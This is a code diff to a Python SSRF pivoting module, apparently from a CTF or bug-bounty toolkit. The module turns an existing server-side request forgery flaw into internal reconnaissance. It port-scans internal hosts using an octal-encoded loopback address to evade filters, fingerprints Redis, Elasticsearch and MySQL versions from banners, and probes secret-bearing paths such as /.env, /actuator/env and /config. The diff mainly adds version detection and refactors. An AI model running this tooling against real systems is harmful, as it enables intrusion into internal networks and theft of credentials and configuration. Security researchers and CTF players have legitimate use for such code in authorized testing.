@@ -2,7 +2,7 @@
 
 Uses an existing SSRF vulnerability to:
 1. Port scan internal services (localhost, private IPs)
-2. Fingerprint discovered services
+2. Fingerprint discovered services (redis, elasticsearch, mysql, http, ...)
 3. Exploit internal web apps found through SSRF
 4. Chain redirects to bypass URL filters
 
@@ -19,7 +19,7 @@ from __future__ import annotations
 
 import re
 from dataclasses import dataclass, field
-from typing import Any, ClassVar
+from typing import Any, ClassVar, TypeGuard
 
 from bugbounty_ctf.engine import SecurityScanner
 
@@ -40,6 +40,8 @@ class InternalService:
     status: str = "unknown"
     content_length: int = 0
     content_preview: str = ""
+    service_name: str = "unknown"
+    version: str = ""
     tech_hints: list[str] = field(default_factory=list)
     endpoints: list[str] = field(default_factory=list)
     flags: list[str] = field(default_factory=list)
@@ -51,6 +53,8 @@ class InternalService:
             "status": self.status,
             "content_length": self.content_length,
             "content_preview": self.content_preview[:200],
+            "service_name": self.service_name,
+            "version": self.version,
             "tech_hints": self.tech_hints,
             "endpoints": self.endpoints,
             "flags": self.flags,
@@ -65,60 +69,31 @@ class SSRFPivot:
     """
 
     DEFAULT_PORTS: ClassVar[list[int]] = [
-        21,
-        22,
-        25,
-        80,
-        443,
-        445,
-        1433,
-        1521,
-        2375,
-        2376,
-        3000,
-        3306,
-        4000,
-        5000,
-        5432,
-        5601,
-        5985,
-        6379,
-        8000,
-        8080,
-        8443,
-        9000,
-        9090,
-        9091,
-        9200,
-        9300,
-        11211,
-        27017,
+        21, 22, 25, 80, 443, 445, 1433, 1521, 2375, 2376, 3000, 3306, 4000,
+        5000, 5432, 5601, 5985, 6379, 8000, 8080, 8443, 9000, 9090, 9091,
+        9200, 9300, 11211, 27017,
     ]
 
     COMMON_PATHS: ClassVar[list[str]] = [
-        "/",
-        "/admin",
-        "/api",
-        "/api/v1",
-        "/api/v1/health",
-        "/health",
-        "/status",
-        "/info",
-        "/config",
-        "/env",
-        "/debug",
-        "/metrics",
-        "/.env",
-        "/flag",
-        "/flag.txt",
-        "/console",
-        "/actuator",
-        "/actuator/env",
-        "/swagger",
-        "/swagger.json",
-        "/openapi.json",
-        "/v2/_catalog",
+        "/", "/admin", "/api", "/api/v1", "/api/v1/health", "/health", "/status",
+        "/info", "/config", "/env", "/debug", "/metrics", "/.env", "/flag",
+        "/flag.txt", "/console", "/actuator", "/actuator/env", "/swagger",
+        "/swagger.json", "/openapi.json", "/v2/_catalog",
     ]
+
+    TECH_HINT_MARKERS: ClassVar[dict[str, str]] = {
+        "nginx-ui": "nginx-ui",
+        "nginx": "nginx",
+        "apache": "apache",
+        "flask": "flask",
+        "werkzeug": "flask",
+        "docker": "docker",
+        "kubernetes": "kubernetes",
+        "k8s": "kubernetes",
+        "jenkins": "jenkins",
+        "grafana": "grafana",
+        "prometheus": "prometheus",
+    }
 
     def __init__(
         self,
@@ -174,6 +149,66 @@ class SSRFPivot:
         except Exception:
             return None
 
+    def _fetch_or_none(self, target_url: str) -> str | None:
+        try:
+            return self._ssrf_fetch(target_url)
+        except Exception:
+            return None
+
+    @staticmethod
+    def _is_open_content(content: str | None) -> TypeGuard[str]:
+        return bool(content and "Could not fetch" not in content and "Security policy" not in content)
+
+    @staticmethod
+    def _is_fingerprint_content(content: str | None) -> TypeGuard[str]:
+        return bool(
+            content
+            and "Not Found" not in content
+            and "404" not in content[:20]
+            and "301" not in content[:20]
+            and "Moved Permanently" not in content[:50]
+        )
+
+    @staticmethod
+    def _first_match(pattern: str, content: str) -> str:
+        match = re.search(pattern, content, re.IGNORECASE | re.MULTILINE)
+        return match.group(1).strip() if match else ""
+
+    @staticmethod
+    def _add_hint(service: InternalService, hint: str) -> None:
+        if hint not in service.tech_hints:
+            service.tech_hints.append(hint)
+
+    @classmethod
+    def _apply_banner_metadata(cls, service: InternalService, content: str) -> None:
+        lower = content.lower()
+        if service.port == 6379 or lower.startswith("-err") or "redis" in lower:
+            service.service_name = "redis"
+            service.version = cls._first_match(r"redis_version:([^\r\n]+)", content)
+        elif service.port in (9200, 9300) or "elasticsearch" in lower:
+            service.service_name = "elasticsearch"
+            service.version = cls._first_match(r'"number"\s*:\s*"([^"]+)"', content)
+        elif service.port == 3306 or "mysql" in lower:
+            service.service_name = "mysql"
+            service.version = cls._first_match(r"\b(\d+\.\d+(?:\.\d+)?)\b.*mysql", content)
+        elif content.startswith("HTTP/") or "<html" in lower or "server:" in lower:
+            service.service_name = "http"
+            service.version = cls._first_match(r"^server:\s*([^\r\n]+)", content)
+
+        for marker, hint in cls.TECH_HINT_MARKERS.items():
+            if marker in lower:
+                cls._add_hint(service, hint)
+
+    @staticmethod
+    def _update_status(service: InternalService, content: str) -> None:
+        lower = content.lower()
+        if "404" in content[:100]:
+            service.status = "open-404"
+        elif "301" in content[:50]:
+            service.status = "open-redirect"
+        elif "<html" in lower:
+            service.status = "open-html"
+
     def port_scan(
         self,
         host: str = "0177.0.0.1",
@@ -188,9 +223,9 @@ class SSRFPivot:
         open_services: list[InternalService] = []
 
         for port in ports:
-            content = self._ssrf_fetch(f"http://{host}:{port}/")
+            content = self._fetch_or_none(f"http://{host}:{port}/")
 
-            if content and "Could not fetch" not in content and "Security policy" not in content:
+            if self._is_open_content(content):
                 service = InternalService(
                     host=host,
                     port=port,
@@ -198,19 +233,8 @@ class SSRFPivot:
                     content_length=len(content),
                     content_preview=content[:200],
                 )
-
-                if "nginx" in content.lower():
-                    service.tech_hints.append("nginx")
-                if "apache" in content.lower():
-                    service.tech_hints.append("apache")
-                if "flask" in content.lower() or "werkzeug" in content.lower():
-                    service.tech_hints.append("flask")
-                if "404" in content[:100]:
-                    service.status = "open-404"
-                elif "301" in content[:50]:
-                    service.status = "open-redirect"
-                elif "<html" in content.lower():
-                    service.status = "open-html"
+                self._apply_banner_metadata(service, content)
+                self._update_status(service, content)
 
                 open_services.append(service)
                 print(f"  [+] {host}:{port} — {service.status} ({service.content_length} bytes)")
@@ -234,34 +258,16 @@ class SSRFPivot:
             print(f"  Fingerprinting {service.host}:{service.port}")
             for path in self.COMMON_PATHS:
                 url = f"http://{service.host}:{service.port}{path}"
-                content = self._ssrf_fetch(url)
+                content = self._fetch_or_none(url)
 
-                if (
-                    content
-                    and "Not Found" not in content
-                    and "404" not in content[:20]
-                    and "301" not in content[:20]
-                    and "Moved Permanently" not in content[:50]
-                ):
+                if self._is_fingerprint_content(content):
                     service.endpoints.append(path)
+                    self._apply_banner_metadata(service, content)
 
                     flags = self._extract_flags(content)
                     if flags:
                         service.flags.extend(flags)
                         print(f"    [FLAG] {path}: {flags}")
-
-                    if "nginx-ui" in content.lower():
-                        service.tech_hints.append("nginx-ui")
-                    if "docker" in content.lower():
-                        service.tech_hints.append("docker")
-                    if "kubernetes" in content.lower() or "k8s" in content.lower():
-                        service.tech_hints.append("kubernetes")
-                    if "jenkins" in content.lower():
-                        service.tech_hints.append("jenkins")
-                    if "grafana" in content.lower():
-                        service.tech_hints.append("grafana")
-                    if "prometheus" in content.lower():
-                        service.tech_hints.append("prometheus")
 
         return services
 
@@ -281,7 +287,7 @@ class SSRFPivot:
 
             for endpoint in service.endpoints:
                 url = f"http://{service.host}:{service.port}{endpoint}"
-                content = self._ssrf_fetch(url)
+                content = self._fetch_or_none(url)
 
                 if content:
                     flags = self._extract_flags(content)
@@ -304,10 +310,7 @@ class SSRFPivot:
     @staticmethod
     def _extract_flags(text: str) -> list[str]:
         """Extract flag patterns from text."""
-        flags: list[str] = []
-        for pattern in FLAG_PATTERNS:
-            flags.extend(re.findall(pattern, text, re.IGNORECASE))
-        return flags
+        return [flag for pattern in FLAG_PATTERNS for flag in re.findall(pattern, text, re.IGNORECASE)]
 
     def get_results(self) -> list[dict[str, Any]]:
         """Return all discovered services as dicts."""
